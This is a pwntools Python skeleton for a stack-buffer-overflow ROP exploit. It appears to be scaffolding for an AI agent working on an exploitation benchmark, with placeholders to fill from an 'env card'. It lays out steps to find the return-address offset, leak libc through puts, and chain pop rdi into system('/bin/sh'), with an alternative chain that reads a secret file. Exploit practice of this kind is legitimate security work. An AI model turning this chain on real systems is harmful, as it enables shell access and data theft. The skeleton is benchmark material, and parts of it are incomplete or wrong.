#!/usr/bin/env python3
"""Stack-overflow ROP skeleton (benchmark binaries: ASLR off, mostly non-PIE,
no canary — check your env card first; if canary=YES leak it before RIP).

Fill CONSTANTS from CLAUDE.md env card. Make each STEP print PASS.
"""
from pwn import ELF, ROP, context, cyclic, flat, process

context.log_level = "info"
context.arch = "amd64"

BINARY = "/out/<binary>"      # TODO
PIE = False                  # env card
BASE = 0x400000              # non-PIE typical
BINSH = None                 # absolute after libc base known (ASLR off -> fixed)
SYSTEM = None                # absolute; if unknown, leak first (STEP 1)
LIBC_SYSTEM_OFF = 0x453a0    # env card
LIBC_BINSH_OFF = 0x18ce57
elf = ELF(BINARY, checksec=False)
rop = ROP(elf)

def build_payload(payload: bytes) -> bytes:
    """Prefix the input format so the parser reaches the copy that smashes the stack."""
    # TODO: keep poc structure; put payload where the overflowed buffer is
    return b"<prefix>" + payload

OFFSET = 0                    # TODO: offset to saved RIP (cyclic find)

# ── STEP 0: find OFFSET ────────────────────────────────────────────────
def step0():
    io = process(["bash", "/workspace/run.sh"], cwd="/workspace")
    io.send(build_payload(cyclic(4096)))
    io.wait()  # crash; core/regs -> cyclic_find(fault_addr) if you attach dmesg/gdb
    # no debugger? binary-search the offset with a canary byte pattern instead.

# ── STEP 1 (only if PIE or SYSTEM unknown): leak ──────────────────────
def leak_chain():
    puts_plt, puts_got = elf.plt["puts"], elf.got["puts"]
    main = elf.symbols.get("main") or elf.symbols.get("__libc_start_main")
    chain = flat(BASE if PIE else 0, 0, puts_plt, main, puts_got)  # fix arg regs with pop rdi
    return chain

# ── STEP 2: fire ───────────────────────────────────────────────────────
def final_chain():
    pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
    return flat(pop_rdi, BINSH, SYSTEM)          # exec: system("/bin/sh")
    # READ-objective alternative: ROP open("/secret") -> read -> write(1)

if __name__ == "__main__":
    step0(); print("STEP0 PASS")
